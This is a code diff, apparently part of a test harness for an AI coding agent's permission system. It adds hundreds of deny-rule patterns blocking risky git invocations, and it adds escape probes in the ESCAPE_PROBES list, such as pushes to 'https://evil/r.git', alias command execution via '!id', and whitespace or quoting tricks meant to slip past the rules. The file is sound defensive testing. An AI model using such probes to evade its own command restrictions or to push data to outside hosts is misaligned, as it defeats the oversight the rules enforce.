+        {"Bash(git checkout '-t':*)"},
+        {"Bash(git*checkout*'-t'*)"},
+        {"Bash(git checkout '--e'*)"},
+        {"Bash(git checkout '--e':*)"},
+        {"Bash(git*checkout*'--e'*)"},
+        {"Bash(git checkout --'e'*)"},
+        {"Bash(git*checkout*--'e'*)"},
+        {"Bash(git checkout '--edit'*)"},
+        {"Bash(git checkout '--edit':*)"},
+        {"Bash(git*checkout*'--edit'*)"},
+        {"Bash(git checkout --'edit'*)"},
+        {"Bash(git*checkout*--'edit'*)"},
+        {"Bash(git checkout '--g'*)"},
+        {"Bash(git checkout '--g':*)"},
+        {"Bash(git*checkout*'--g'*)"},
+        {"Bash(git checkout --'g'*)"},
+        {"Bash(git*checkout*--'g'*)"},
+        {"Bash(git checkout '--gpg-sign'*)"},
+        {"Bash(git checkout '--gpg-sign':*)"},
+        {"Bash(git*checkout*'--gpg-sign'*)"},
+        {"Bash(git checkout --'gpg-sign'*)"},
+        {"Bash(git*checkout*--'gpg-sign'*)"},
+        {"Bash(git checkout '--te'*)"},
+        {"Bash(git checkout '--te':*)"},
+        {"Bash(git*checkout*'--te'*)"},
+        {"Bash(git checkout --'te'*)"},
+        {"Bash(git*checkout*--'te'*)"},
+        {"Bash(git checkout '--template'*)"},
+        {"Bash(git checkout '--template':*)"},
+        {"Bash(git*checkout*'--template'*)"},
+        {"Bash(git checkout --'template'*)"},
+        {"Bash(git*checkout*--'template'*)"},
+        {"Bash(git checkout '--sq'*)"},
+        {"Bash(git checkout '--sq':*)"},
+        {"Bash(git*checkout*'--sq'*)"},
+        {"Bash(git checkout --'sq'*)"},
+        {"Bash(git*checkout*--'sq'*)"},
+        {"Bash(git checkout '--squash'*)"},
+        {"Bash(git checkout '--squash':*)"},
+        {"Bash(git*checkout*'--squash'*)"},
+        {"Bash(git checkout --'squash'*)"},
+        {"Bash(git*checkout*--'squash'*)"},
+        {"Bash(git checkout '--fix'*)"},
+        {"Bash(git checkout '--fix':*)"},
+        {"Bash(git*checkout*'--fix'*)"},
+        {"Bash(git checkout --'fix'*)"},
+        {"Bash(git*checkout*--'fix'*)"},
+        {"Bash(git checkout '--fixup'*)"},
+        {"Bash(git checkout '--fixup':*)"},
+        {"Bash(git*checkout*'--fixup'*)"},
+        {"Bash(git checkout --'fixup'*)"},
+        {"Bash(git*checkout*--'fixup'*)"},
+        {"Bash(git checkout '--rece'*)"},
+        {"Bash(git checkout '--rece':*)"},
+        {"Bash(git*checkout*'--rece'*)"},
+        {"Bash(git checkout --'rece'*)"},
+        {"Bash(git*checkout*--'rece'*)"},
+        {"Bash(git checkout '--receive-pack'*)"},
+        {"Bash(git checkout '--receive-pack':*)"},
+        {"Bash(git*checkout*'--receive-pack'*)"},
+        {"Bash(git checkout --'receive-pack'*)"},
+        {"Bash(git*checkout*--'receive-pack'*)"},
+        {"Bash(git checkout '--exec'*)"},
+        {"Bash(git checkout '--exec':*)"},
+        {"Bash(git*checkout*'--exec'*)"},
+        {"Bash(git checkout --'exec'*)"},
+        {"Bash(git*checkout*--'exec'*)"},
+        {"Bash(git checkout '--rep'*)"},
+        {"Bash(git checkout '--rep':*)"},
+        {"Bash(git*checkout*'--rep'*)"},
+        {"Bash(git checkout --'rep'*)"},
+        {"Bash(git*checkout*--'rep'*)"},
+        {"Bash(git checkout '--repo'*)"},
+        {"Bash(git checkout '--repo':*)"},
+        {"Bash(git*checkout*'--repo'*)"},
+        {"Bash(git checkout --'repo'*)"},
+        {"Bash(git*checkout*--'repo'*)"},
+        {"Bash(git checkout '--recu'*)"},
+        {"Bash(git checkout '--recu':*)"},
+        {"Bash(git*checkout*'--recu'*)"},
+        {"Bash(git checkout --'recu'*)"},
+        {"Bash(git*checkout*--'recu'*)"},
+        {"Bash(git checkout '--recurse-submodules'*)"},
+        {"Bash(git checkout '--recurse-submodules':*)"},
+        {"Bash(git*checkout*'--recurse-submodules'*)"},
+        {"Bash(git checkout --'recurse-submodules'*)"},
+        {"Bash(git*checkout*--'recurse-submodules'*)"},
+        {"Bash(git checkout '--r'*)"},
+        {"Bash(git checkout '--r':*)"},
+        {"Bash(git*checkout*'--r'*)"},
+        {"Bash(git checkout --'r'*)"},
+        {"Bash(git*checkout*--'r'*)"},
+        {"Bash(git checkout \"-e\"*)"},
+        {"Bash(git checkout \"-e\":*)"},
+        {"Bash(git*checkout*\"-e\"*)"},
+        {"Bash(git checkout \"-c\"*)"},
+        {"Bash(git checkout \"-c\":*)"},
+        {"Bash(git*checkout*\"-c\"*)"},
+        {"Bash(git checkout \"-S\"*)"},
+        {"Bash(git checkout \"-S\":*)"},
+        {"Bash(git*checkout*\"-S\"*)"},
+        {"Bash(git checkout \"-t\"*)"},
+        {"Bash(git checkout \"-t\":*)"},
+        {"Bash(git*checkout*\"-t\"*)"},
+        {"Bash(git checkout \"--e\"*)"},
+        {"Bash(git checkout \"--e\":*)"},
+        {"Bash(git*checkout*\"--e\"*)"},
+        {"Bash(git checkout --\"e\"*)"},
+        {"Bash(git*checkout*--\"e\"*)"},
+        {"Bash(git checkout \"--edit\"*)"},
+        {"Bash(git checkout \"--edit\":*)"},
+        {"Bash(git*checkout*\"--edit\"*)"},
+        {"Bash(git checkout --\"edit\"*)"},
+        {"Bash(git*checkout*--\"edit\"*)"},
+        {"Bash(git checkout \"--g\"*)"},
+        {"Bash(git checkout \"--g\":*)"},
+        {"Bash(git*checkout*\"--g\"*)"},
+        {"Bash(git checkout --\"g\"*)"},
+        {"Bash(git*checkout*--\"g\"*)"},
+        {"Bash(git checkout \"--gpg-sign\"*)"},
+        {"Bash(git checkout \"--gpg-sign\":*)"},
+        {"Bash(git*checkout*\"--gpg-sign\"*)"},
+        {"Bash(git checkout --\"gpg-sign\"*)"},
+        {"Bash(git*checkout*--\"gpg-sign\"*)"},
+        {"Bash(git checkout \"--te\"*)"},
+        {"Bash(git checkout \"--te\":*)"},
+        {"Bash(git*checkout*\"--te\"*)"},
+        {"Bash(git checkout --\"te\"*)"},
+        {"Bash(git*checkout*--\"te\"*)"},
+        {"Bash(git checkout \"--template\"*)"},
+        {"Bash(git checkout \"--template\":*)"},
+        {"Bash(git*checkout*\"--template\"*)"},
+        {"Bash(git checkout --\"template\"*)"},
+        {"Bash(git*checkout*--\"template\"*)"},
+        {"Bash(git checkout \"--sq\"*)"},
+        {"Bash(git checkout \"--sq\":*)"},
+        {"Bash(git*checkout*\"--sq\"*)"},
+        {"Bash(git checkout --\"sq\"*)"},
+        {"Bash(git*checkout*--\"sq\"*)"},
+        {"Bash(git checkout \"--squash\"*)"},
+        {"Bash(git checkout \"--squash\":*)"},
+        {"Bash(git*checkout*\"--squash\"*)"},
+        {"Bash(git checkout --\"squash\"*)"},
+        {"Bash(git*checkout*--\"squash\"*)"},
+        {"Bash(git checkout \"--fix\"*)"},
+        {"Bash(git checkout \"--fix\":*)"},
+        {"Bash(git*checkout*\"--fix\"*)"},
+        {"Bash(git checkout --\"fix\"*)"},
+        {"Bash(git*checkout*--\"fix\"*)"},
+        {"Bash(git checkout \"--fixup\"*)"},
+        {"Bash(git checkout \"--fixup\":*)"},
+        {"Bash(git*checkout*\"--fixup\"*)"},
+        {"Bash(git checkout --\"fixup\"*)"},
+        {"Bash(git*checkout*--\"fixup\"*)"},
+        {"Bash(git checkout \"--rece\"*)"},
+        {"Bash(git checkout \"--rece\":*)"},
+        {"Bash(git*checkout*\"--rece\"*)"},
+        {"Bash(git checkout --\"rece\"*)"},
+        {"Bash(git*checkout*--\"rece\"*)"},
+        {"Bash(git checkout \"--receive-pack\"*)"},
+        {"Bash(git checkout \"--receive-pack\":*)"},
+        {"Bash(git*checkout*\"--receive-pack\"*)"},
+        {"Bash(git checkout --\"receive-pack\"*)"},
+        {"Bash(git*checkout*--\"receive-pack\"*)"},
+        {"Bash(git checkout \"--exec\"*)"},
+        {"Bash(git checkout \"--exec\":*)"},
+        {"Bash(git*checkout*\"--exec\"*)"},
+        {"Bash(git checkout --\"exec\"*)"},
+        {"Bash(git*checkout*--\"exec\"*)"},
+        {"Bash(git checkout \"--rep\"*)"},
+        {"Bash(git checkout \"--rep\":*)"},
+        {"Bash(git*checkout*\"--rep\"*)"},
+        {"Bash(git checkout --\"rep\"*)"},
+        {"Bash(git*checkout*--\"rep\"*)"},
+        {"Bash(git checkout \"--repo\"*)"},
+        {"Bash(git checkout \"--repo\":*)"},
+        {"Bash(git*checkout*\"--repo\"*)"},
+        {"Bash(git checkout --\"repo\"*)"},
+        {"Bash(git*checkout*--\"repo\"*)"},
+        {"Bash(git checkout \"--recu\"*)"},
+        {"Bash(git checkout \"--recu\":*)"},
+        {"Bash(git*checkout*\"--recu\"*)"},
+        {"Bash(git checkout --\"recu\"*)"},
+        {"Bash(git*checkout*--\"recu\"*)"},
+        {"Bash(git checkout \"--recurse-submodules\"*)"},
+        {"Bash(git checkout \"--recurse-submodules\":*)"},
+        {"Bash(git*checkout*\"--recurse-submodules\"*)"},
+        {"Bash(git checkout --\"recurse-submodules\"*)"},
+        {"Bash(git*checkout*--\"recurse-submodules\"*)"},
+        {"Bash(git checkout \"--r\"*)"},
+        {"Bash(git checkout \"--r\":*)"},
+        {"Bash(git*checkout*\"--r\"*)"},
+        {"Bash(git checkout --\"r\"*)"},
+        {"Bash(git*checkout*--\"r\"*)"},
     ]
 else:
     sys.stderr.write(f"unknown backstop kind {kind!r}\n")
@@ -1854,6 +2710,29 @@ ESCAPE_PROBES = [
     "git commit -ue",
     "git commit -me",
     "git commit -pe",
+    # Wrapper IFS (command/env ↔ git).
+    "command  git push https://evil/r.git HEAD",
+    "command\tgit push https://evil/r.git HEAD",
+    "command -p  git add -e file",
+    "/usr/bin/env  git push https://evil/r.git HEAD",
+    "/usr/bin/env\tgit push origin HEAD",
+    "env\tgit -c alias.x='!id' x",
+    # apply / am / init.
+    "git apply --unsafe-paths evil.patch",
+    "git\tapply evil.patch",
+    "git am evil.mbox",
+    "git\tam evil.mbox",
+    "git  am evil.mbox",
+    "git -C . am evil.mbox",
+    "git init --separate-git-dir=/tmp/evil .",
+    "git\tinit /tmp/evil",
+    # Quoted option-first flags.
+    "git add '-e' file",
+    "git add \"-e\" file",
+    "git add --'edit' file",
+    "git commit --'template'=x",
+    "git commit --'fixup'=HEAD",
+    "git push origin --'exec'=id",
     "gh alias set x y", "gh extension install o/r", "gh ext exec x",
     "gh config set pager x", "gh codespace ssh", "gh cs ssh",
     "gh secret list", "gh ssh-key add k", "gh gpg-key add k",
@@ -3490,19 +4369,905 @@ EOF
     "Bash(command -p -- git*)"
     "Bash(command -v git*)"
     "Bash(*env git*)"
+    "Bash(command*git*)"
+    "Bash(command -p*git*)"
+    "Bash(command --*git*)"
+    "Bash(/usr/bin/env*git*)"
+    "Bash(/bin/env*git*)"
+    "Bash(*/env*git*)"
+    "Bash(env*git*)"
+    "Bash(git apply:*)"
+    "Bash(git apply*)"
+    "Bash(git*apply:*)"
+    "Bash(git*apply*)"
+    "Bash(git am:*)"
+    "Bash(git am*)"
+    $'Bash(git\tam:*)'
+    $'Bash(git\tam*)'
+    "Bash(git  am:*)"
+    "Bash(git  am*)"
+    "Bash(git -C * am:*)"
+    "Bash(git -C * am*)"
+    "Bash(git -c * am:*)"
+    "Bash(git -c * am*)"
+    $'Bash(git\t-C * am:*)'
+    $'Bash(git\t-C * am*)'
+    $'Bash(git\t-c * am:*)'
+    $'Bash(git\t-c * am*)'
+    "Bash(git  -C * am:*)"
+    "Bash(git  -C * am*)"
+    "Bash(git  -c * am:*)"
+    "Bash(git  -c * am*)"
+    $'Bash(git*\tam:*)'
+    $'Bash(git*\tam*)'
+    "Bash(git init:*)"
+    "Bash(git init*)"
+    "Bash(git*init:*)"
+    "Bash(git*init*)"
+    'Bash(git add '\''-e'\''*)'
+    'Bash(git add '\''-e'\'':*)'
+    'Bash(git*add*'\''-e'\''*)'
+    'Bash(git add '\''-c'\''*)'
+    'Bash(git add '\''-c'\'':*)'
+    'Bash(git*add*'\''-c'\''*)'
+    'Bash(git add '\''-S'\''*)'
+    'Bash(git add '\''-S'\'':*)'
+    'Bash(git*add*'\''-S'\''*)'
+    'Bash(git add '\''-t'\''*)'
+    'Bash(git add '\''-t'\'':*)'
+    'Bash(git*add*'\''-t'\''*)'
+    'Bash(git add '\''--e'\''*)'
+    'Bash(git add '\''--e'\'':*)'
+    'Bash(git*add*'\''--e'\''*)'
+    'Bash(git add --'\''e'\''*)'
+    'Bash(git*add*--'\''e'\''*)'
+    'Bash(git add '\''--edit'\''*)'
+    'Bash(git add '\''--edit'\'':*)'
+    'Bash(git*add*'\''--edit'\''*)'
+    'Bash(git add --'\''edit'\''*)'
+    'Bash(git*add*--'\''edit'\''*)'
+    'Bash(git add '\''--g'\''*)'
+    'Bash(git add '\''--g'\'':*)'
+    'Bash(git*add*'\''--g'\''*)'
+    'Bash(git add --'\''g'\''*)'
+    'Bash(git*add*--'\''g'\''*)'
+    'Bash(git add '\''--gpg-sign'\''*)'
+    'Bash(git add '\''--gpg-sign'\'':*)'
+    'Bash(git*add*'\''--gpg-sign'\''*)'
+    'Bash(git add --'\''gpg-sign'\''*)'
+    'Bash(git*add*--'\''gpg-sign'\''*)'
+    'Bash(git add '\''--te'\''*)'
+    'Bash(git add '\''--te'\'':*)'
+    'Bash(git*add*'\''--te'\''*)'
+    'Bash(git add --'\''te'\''*)'
+    'Bash(git*add*--'\''te'\''*)'
+    'Bash(git add '\''--template'\''*)'
+    'Bash(git add '\''--template'\'':*)'
+    'Bash(git*add*'\''--template'\''*)'
+    'Bash(git add --'\''template'\''*)'
+    'Bash(git*add*--'\''template'\''*)'
+    'Bash(git add '\''--sq'\''*)'
+    'Bash(git add '\''--sq'\'':*)'
+    'Bash(git*add*'\''--sq'\''*)'
+    'Bash(git add --'\''sq'\''*)'
+    'Bash(git*add*--'\''sq'\''*)'
+    'Bash(git add '\''--squash'\''*)'
+    'Bash(git add '\''--squash'\'':*)'
+    'Bash(git*add*'\''--squash'\''*)'
+    'Bash(git add --'\''squash'\''*)'
+    'Bash(git*add*--'\''squash'\''*)'
+    'Bash(git add '\''--fix'\''*)'
+    'Bash(git add '\''--fix'\'':*)'
+    'Bash(git*add*'\''--fix'\''*)'
+    'Bash(git add --'\''fix'\''*)'
+    'Bash(git*add*--'\''fix'\''*)'
+    'Bash(git add '\''--fixup'\''*)'
+    'Bash(git add '\''--fixup'\'':*)'
+    'Bash(git*add*'\''--fixup'\''*)'
+    'Bash(git add --'\''fixup'\''*)'
+    'Bash(git*add*--'\''fixup'\''*)'
+    'Bash(git add '\''--rece'\''*)'
+    'Bash(git add '\''--rece'\'':*)'
+    'Bash(git*add*'\''--rece'\''*)'
+    'Bash(git add --'\''rece'\''*)'
+    'Bash(git*add*--'\''rece'\''*)'
+    'Bash(git add '\''--receive-pack'\''*)'
+    'Bash(git add '\''--receive-pack'\'':*)'
+    'Bash(git*add*'\''--receive-pack'\''*)'
+    'Bash(git add --'\''receive-pack'\''*)'
+    'Bash(git*add*--'\''receive-pack'\''*)'
+    'Bash(git add '\''--exec'\''*)'
+    'Bash(git add '\''--exec'\'':*)'
+    'Bash(git*add*'\''--exec'\''*)'
+    'Bash(git add --'\''exec'\''*)'
+    'Bash(git*add*--'\''exec'\''*)'
+    'Bash(git add '\''--rep'\''*)'
+    'Bash(git add '\''--rep'\'':*)'
+    'Bash(git*add*'\''--rep'\''*)'
+    'Bash(git add --'\''rep'\''*)'
+    'Bash(git*add*--'\''rep'\''*)'
+    'Bash(git add '\''--repo'\''*)'
+    'Bash(git add '\''--repo'\'':*)'
+    'Bash(git*add*'\''--repo'\''*)'
+    'Bash(git add --'\''repo'\''*)'
+    'Bash(git*add*--'\''repo'\''*)'
+    'Bash(git add '\''--recu'\''*)'
+    'Bash(git add '\''--recu'\'':*)'
+    'Bash(git*add*'\''--recu'\''*)'
+    'Bash(git add --'\''recu'\''*)'
+    'Bash(git*add*--'\''recu'\''*)'
+    'Bash(git add '\''--recurse-submodules'\''*)'
+    'Bash(git add '\''--recurse-submodules'\'':*)'
+    'Bash(git*add*'\''--recurse-submodules'\''*)'
+    'Bash(git add --'\''recurse-submodules'\''*)'
+    'Bash(git*add*--'\''recurse-submodules'\''*)'
+    'Bash(git add '\''--r'\''*)'
+    'Bash(git add '\''--r'\'':*)'
+    'Bash(git*add*'\''--r'\''*)'
+    'Bash(git add --'\''r'\''*)'
+    'Bash(git*add*--'\''r'\''*)'
+    $'Bash(git add \"-e\"*)'
+    $'Bash(git add \"-e\":*)'
+    $'Bash(git*add*\"-e\"*)'
+    $'Bash(git add \"-c\"*)'
+    $'Bash(git add \"-c\":*)'
+    $'Bash(git*add*\"-c\"*)'
+    $'Bash(git add \"-S\"*)'
+    $'Bash(git add \"-S\":*)'
+    $'Bash(git*add*\"-S\"*)'
+    $'Bash(git add \"-t\"*)'
+    $'Bash(git add \"-t\":*)'
+    $'Bash(git*add*\"-t\"*)'
+    $'Bash(git add \"--e\"*)'
+    $'Bash(git add \"--e\":*)'
+    $'Bash(git*add*\"--e\"*)'
+    $'Bash(git add --\"e\"*)'
+    $'Bash(git*add*--\"e\"*)'
+    $'Bash(git add \"--edit\"*)'
+    $'Bash(git add \"--edit\":*)'
+    $'Bash(git*add*\"--edit\"*)'
+    $'Bash(git add --\"edit\"*)'
+    $'Bash(git*add*--\"edit\"*)'
+    $'Bash(git add \"--g\"*)'
+    $'Bash(git add \"--g\":*)'
+    $'Bash(git*add*\"--g\"*)'
+    $'Bash(git add --\"g\"*)'
+    $'Bash(git*add*--\"g\"*)'
+    $'Bash(git add \"--gpg-sign\"*)'
+    $'Bash(git add \"--gpg-sign\":*)'
+    $'Bash(git*add*\"--gpg-sign\"*)'
+    $'Bash(git add --\"gpg-sign\"*)'
+    $'Bash(git*add*--\"gpg-sign\"*)'
+    $'Bash(git add \"--te\"*)'
+    $'Bash(git add \"--te\":*)'
+    $'Bash(git*add*\"--te\"*)'
+    $'Bash(git add --\"te\"*)'
+    $'Bash(git*add*--\"te\"*)'
+    $'Bash(git add \"--template\"*)'
+    $'Bash(git add \"--template\":*)'
+    $'Bash(git*add*\"--template\"*)'
+    $'Bash(git add --\"template\"*)'
+    $'Bash(git*add*--\"template\"*)'
+    $'Bash(git add \"--sq\"*)'
+    $'Bash(git add \"--sq\":*)'
+    $'Bash(git*add*\"--sq\"*)'
+    $'Bash(git add --\"sq\"*)'
+    $'Bash(git*add*--\"sq\"*)'
+    $'Bash(git add \"--squash\"*)'
+    $'Bash(git add \"--squash\":*)'
+    $'Bash(git*add*\"--squash\"*)'
+    $'Bash(git add --\"squash\"*)'
+    $'Bash(git*add*--\"squash\"*)'
+    $'Bash(git add \"--fix\"*)'
+    $'Bash(git add \"--fix\":*)'
+    $'Bash(git*add*\"--fix\"*)'
+    $'Bash(git add --\"fix\"*)'
+    $'Bash(git*add*--\"fix\"*)'
+    $'Bash(git add \"--fixup\"*)'
+    $'Bash(git add \"--fixup\":*)'
+    $'Bash(git*add*\"--fixup\"*)'
+    $'Bash(git add --\"fixup\"*)'
+    $'Bash(git*add*--\"fixup\"*)'
+    $'Bash(git add \"--rece\"*)'
+    $'Bash(git add \"--rece\":*)'
+    $'Bash(git*add*\"--rece\"*)'
+    $'Bash(git add --\"rece\"*)'
+    $'Bash(git*add*--\"rece\"*)'
+    $'Bash(git add \"--receive-pack\"*)'
+    $'Bash(git add \"--receive-pack\":*)'
+    $'Bash(git*add*\"--receive-pack\"*)'
+    $'Bash(git add --\"receive-pack\"*)'
+    $'Bash(git*add*--\"receive-pack\"*)'
+    $'Bash(git add \"--exec\"*)'
+    $'Bash(git add \"--exec\":*)'
+    $'Bash(git*add*\"--exec\"*)'
+    $'Bash(git add --\"exec\"*)'
+    $'Bash(git*add*--\"exec\"*)'
+    $'Bash(git add \"--rep\"*)'
+    $'Bash(git add \"--rep\":*)'
+    $'Bash(git*add*\"--rep\"*)'
+    $'Bash(git add --\"rep\"*)'
+    $'Bash(git*add*--\"rep\"*)'
+    $'Bash(git add \"--repo\"*)'
+    $'Bash(git add \"--repo\":*)'
+    $'Bash(git*add*\"--repo\"*)'
+    $'Bash(git add --\"repo\"*)'
+    $'Bash(git*add*--\"repo\"*)'
+    $'Bash(git add \"--recu\"*)'
+    $'Bash(git add \"--recu\":*)'
+    $'Bash(git*add*\"--recu\"*)'
+    $'Bash(git add --\"recu\"*)'
+    $'Bash(git*add*--\"recu\"*)'
+    $'Bash(git add \"--recurse-submodules\"*)'
+    $'Bash(git add \"--recurse-submodules\":*)'
+    $'Bash(git*add*\"--recurse-submodules\"*)'
+    $'Bash(git add --\"recurse-submodules\"*)'
+    $'Bash(git*add*--\"recurse-submodules\"*)'
+    $'Bash(git add \"--r\"*)'
+    $'Bash(git add \"--r\":*)'
+    $'Bash(git*add*\"--r\"*)'
+    $'Bash(git add --\"r\"*)'
+    $'Bash(git*add*--\"r\"*)'
+    'Bash(git commit '\''-e'\''*)'
+    'Bash(git commit '\''-e'\'':*)'
+    'Bash(git*commit*'\''-e'\''*)'
+    'Bash(git commit '\''-c'\''*)'
+    'Bash(git commit '\''-c'\'':*)'
+    'Bash(git*commit*'\''-c'\''*)'
+    'Bash(git commit '\''-S'\''*)'
+    'Bash(git commit '\''-S'\'':*)'
+    'Bash(git*commit*'\''-S'\''*)'
+    'Bash(git commit '\''-t'\''*)'
+    'Bash(git commit '\''-t'\'':*)'
+    'Bash(git*commit*'\''-t'\''*)'
+    'Bash(git commit '\''--e'\''*)'
+    'Bash(git commit '\''--e'\'':*)'
+    'Bash(git*commit*'\''--e'\''*)'
+    'Bash(git commit --'\''e'\''*)'
+    'Bash(git*commit*--'\''e'\''*)'
+    'Bash(git commit '\''--edit'\''*)'
+    'Bash(git commit '\''--edit'\'':*)'
+    'Bash(git*commit*'\''--edit'\''*)'
+    'Bash(git commit --'\''edit'\''*)'
+    'Bash(git*commit*--'\''edit'\''*)'
+    'Bash(git commit '\''--g'\''*)'
+    'Bash(git commit '\''--g'\'':*)'
+    'Bash(git*commit*'\''--g'\''*)'
+    'Bash(git commit --'\''g'\''*)'
+    'Bash(git*commit*--'\''g'\''*)'
+    'Bash(git commit '\''--gpg-sign'\''*)'
+    'Bash(git commit '\''--gpg-sign'\'':*)'
+    'Bash(git*commit*'\''--gpg-sign'\''*)'
+    'Bash(git commit --'\''gpg-sign'\''*)'
+    'Bash(git*commit*--'\''gpg-sign'\''*)'
+    'Bash(git commit '\''--te'\''*)'
+    'Bash(git commit '\''--te'\'':*)'
+    'Bash(git*commit*'\''--te'\''*)'
+    'Bash(git commit --'\''te'\''*)'
+    'Bash(git*commit*--'\''te'\''*)'
+    'Bash(git commit '\''--template'\''*)'
+    'Bash(git commit '\''--template'\'':*)'
+    'Bash(git*commit*'\''--template'\''*)'
+    'Bash(git commit --'\''template'\''*)'
+    'Bash(git*commit*--'\''template'\''*)'
+    'Bash(git commit '\''--sq'\''*)'
+    'Bash(git commit '\''--sq'\'':*)'
+    'Bash(git*commit*'\''--sq'\''*)'
+    'Bash(git commit --'\''sq'\''*)'
+    'Bash(git*commit*--'\''sq'\''*)'
+    'Bash(git commit '\''--squash'\''*)'
+    'Bash(git commit '\''--squash'\'':*)'
+    'Bash(git*commit*'\''--squash'\''*)'
+    'Bash(git commit --'\''squash'\''*)'
+    'Bash(git*commit*--'\''squash'\''*)'
+    'Bash(git commit '\''--fix'\''*)'
+    'Bash(git commit '\''--fix'\'':*)'
+    'Bash(git*commit*'\''--fix'\''*)'
+    'Bash(git commit --'\''fix'\''*)'
+    'Bash(git*commit*--'\''fix'\''*)'
+    'Bash(git commit '\''--fixup'\''*)'
+    'Bash(git commit '\''--fixup'\'':*)'
+    'Bash(git*commit*'\''--fixup'\''*)'
+    'Bash(git commit --'\''fixup'\''*)'
+    'Bash(git*commit*--'\''fixup'\''*)'
+    'Bash(git commit '\''--rece'\''*)'
+    'Bash(git commit '\''--rece'\'':*)'
+    'Bash(git*commit*'\''--rece'\''*)'
+    'Bash(git commit --'\''rece'\''*)'
+    'Bash(git*commit*--'\''rece'\''*)'
+    'Bash(git commit '\''--receive-pack'\''*)'
+    'Bash(git commit '\''--receive-pack'\'':*)'
+    'Bash(git*commit*'\''--receive-pack'\''*)'
+    'Bash(git commit --'\''receive-pack'\''*)'
+    'Bash(git*commit*--'\''receive-pack'\''*)'
+    'Bash(git commit '\''--exec'\''*)'
+    'Bash(git commit '\''--exec'\'':*)'
+    'Bash(git*commit*'\''--exec'\''*)'
+    'Bash(git commit --'\''exec'\''*)'
+    'Bash(git*commit*--'\''exec'\''*)'
+    'Bash(git commit '\''--rep'\''*)'
+    'Bash(git commit '\''--rep'\'':*)'
+    'Bash(git*commit*'\''--rep'\''*)'
+    'Bash(git commit --'\''rep'\''*)'
+    'Bash(git*commit*--'\''rep'\''*)'
+    'Bash(git commit '\''--repo'\''*)'
+    'Bash(git commit '\''--repo'\'':*)'
+    'Bash(git*commit*'\''--repo'\''*)'
+    'Bash(git commit --'\''repo'\''*)'
+    'Bash(git*commit*--'\''repo'\''*)'
+    'Bash(git commit '\''--recu'\''*)'
+    'Bash(git commit '\''--recu'\'':*)'
+    'Bash(git*commit*'\''--recu'\''*)'
+    'Bash(git commit --'\''recu'\''*)'
+    'Bash(git*commit*--'\''recu'\''*)'
+    'Bash(git commit '\''--recurse-submodules'\''*)'
+    'Bash(git commit '\''--recurse-submodules'\'':*)'
+    'Bash(git*commit*'\''--recurse-submodules'\''*)'
+    'Bash(git commit --'\''recurse-submodules'\''*)'
+    'Bash(git*commit*--'\''recurse-submodules'\''*)'
+    'Bash(git commit '\''--r'\''*)'
+    'Bash(git commit '\''--r'\'':*)'
+    'Bash(git*commit*'\''--r'\''*)'
+    'Bash(git commit --'\''r'\''*)'
+    'Bash(git*commit*--'\''r'\''*)'
+    $'Bash(git commit \"-e\"*)'
+    $'Bash(git commit \"-e\":*)'
+    $'Bash(git*commit*\"-e\"*)'
+    $'Bash(git commit \"-c\"*)'
+    $'Bash(git commit \"-c\":*)'
+    $'Bash(git*commit*\"-c\"*)'
+    $'Bash(git commit \"-S\"*)'
+    $'Bash(git commit \"-S\":*)'
+    $'Bash(git*commit*\"-S\"*)'
+    $'Bash(git commit \"-t\"*)'
+    $'Bash(git commit \"-t\":*)'
+    $'Bash(git*commit*\"-t\"*)'
+    $'Bash(git commit \"--e\"*)'
+    $'Bash(git commit \"--e\":*)'
+    $'Bash(git*commit*\"--e\"*)'
+    $'Bash(git commit --\"e\"*)'
+    $'Bash(git*commit*--\"e\"*)'
+    $'Bash(git commit \"--edit\"*)'
+    $'Bash(git commit \"--edit\":*)'
+    $'Bash(git*commit*\"--edit\"*)'
+    $'Bash(git commit --\"edit\"*)'
+    $'Bash(git*commit*--\"edit\"*)'
+    $'Bash(git commit \"--g\"*)'
+    $'Bash(git commit \"--g\":*)'
+    $'Bash(git*commit*\"--g\"*)'
+    $'Bash(git commit --\"g\"*)'
+    $'Bash(git*commit*--\"g\"*)'
+    $'Bash(git commit \"--gpg-sign\"*)'
+    $'Bash(git commit \"--gpg-sign\":*)'
+    $'Bash(git*commit*\"--gpg-sign\"*)'
+    $'Bash(git commit --\"gpg-sign\"*)'
+    $'Bash(git*commit*--\"gpg-sign\"*)'
+    $'Bash(git commit \"--te\"*)'
+    $'Bash(git commit \"--te\":*)'
+    $'Bash(git*commit*\"--te\"*)'
+    $'Bash(git commit --\"te\"*)'
+    $'Bash(git*commit*--\"te\"*)'
+    $'Bash(git commit \"--template\"*)'
+    $'Bash(git commit \"--template\":*)'
+    $'Bash(git*commit*\"--template\"*)'
+    $'Bash(git commit --\"template\"*)'
+    $'Bash(git*commit*--\"template\"*)'
+    $'Bash(git commit \"--sq\"*)'
+    $'Bash(git commit \"--sq\":*)'
+    $'Bash(git*commit*\"--sq\"*)'
+    $'Bash(git commit --\"sq\"*)'
+    $'Bash(git*commit*--\"sq\"*)'
+    $'Bash(git commit \"--squash\"*)'
+    $'Bash(git commit \"--squash\":*)'
+    $'Bash(git*commit*\"--squash\"*)'
+    $'Bash(git commit --\"squash\"*)'
+    $'Bash(git*commit*--\"squash\"*)'
+    $'Bash(git commit \"--fix\"*)'
+    $'Bash(git commit \"--fix\":*)'
+    $'Bash(git*commit*\"--fix\"*)'
+    $'Bash(git commit --\"fix\"*)'
+    $'Bash(git*commit*--\"fix\"*)'
+    $'Bash(git commit \"--fixup\"*)'
+    $'Bash(git commit \"--fixup\":*)'
+    $'Bash(git*commit*\"--fixup\"*)'
+    $'Bash(git commit --\"fixup\"*)'
+    $'Bash(git*commit*--\"fixup\"*)'
+    $'Bash(git commit \"--rece\"*)'
+    $'Bash(git commit \"--rece\":*)'
+    $'Bash(git*commit*\"--rece\"*)'
+    $'Bash(git commit --\"rece\"*)'
+    $'Bash(git*commit*--\"rece\"*)'
+    $'Bash(git commit \"--receive-pack\"*)'
+    $'Bash(git commit \"--receive-pack\":*)'
+    $'Bash(git*commit*\"--receive-pack\"*)'
+    $'Bash(git commit --\"receive-pack\"*)'
+    $'Bash(git*commit*--\"receive-pack\"*)'
+    $'Bash(git commit \"--exec\"*)'
+    $'Bash(git commit \"--exec\":*)'
+    $'Bash(git*commit*\"--exec\"*)'
+    $'Bash(git commit --\"exec\"*)'
+    $'Bash(git*commit*--\"exec\"*)'
+    $'Bash(git commit \"--rep\"*)'
+    $'Bash(git commit \"--rep\":*)'
+    $'Bash(git*commit*\"--rep\"*)'
+    $'Bash(git commit --\"rep\"*)'
+    $'Bash(git*commit*--\"rep\"*)'
+    $'Bash(git commit \"--repo\"*)'
+    $'Bash(git commit \"--repo\":*)'
+    $'Bash(git*commit*\"--repo\"*)'
+    $'Bash(git commit --\"repo\"*)'
